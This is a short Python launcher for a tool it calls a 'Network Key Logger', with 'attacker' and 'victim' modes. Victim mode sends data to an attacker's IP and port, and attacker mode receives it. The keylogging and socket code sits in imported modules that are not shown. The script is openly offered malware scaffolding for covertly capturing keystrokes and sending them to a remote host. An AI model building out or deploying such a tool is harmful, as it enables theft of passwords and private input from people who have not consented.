import argparse
from ipaddress import ip_address

parser = argparse.ArgumentParser(prog='NKL', description='Network Key Logger')
parser.add_argument('-t','--type',choices=['attacker','victim'],required=True,help='Choose what to do with this machine, "attack" to recieve data or "victim" to send data')
parser.add_argument('-a','--address',required=True,type=ip_address,help=" ip to listen on or send to")
parser.add_argument('-p','--port',default=8954,type=int,help='Port to listen on or send to (default: 8954)')

args = parser.parse_args()

ADDRESS = (args.address.__str__(),args.port)

if __name__ == '__main__':
    if args.type == 'victim': 
        from victim import *
        victim_socket(ADDRESS)

    if args.type == 'attacker': 
        from attacker import *
        attacker_socket(ADDRESS)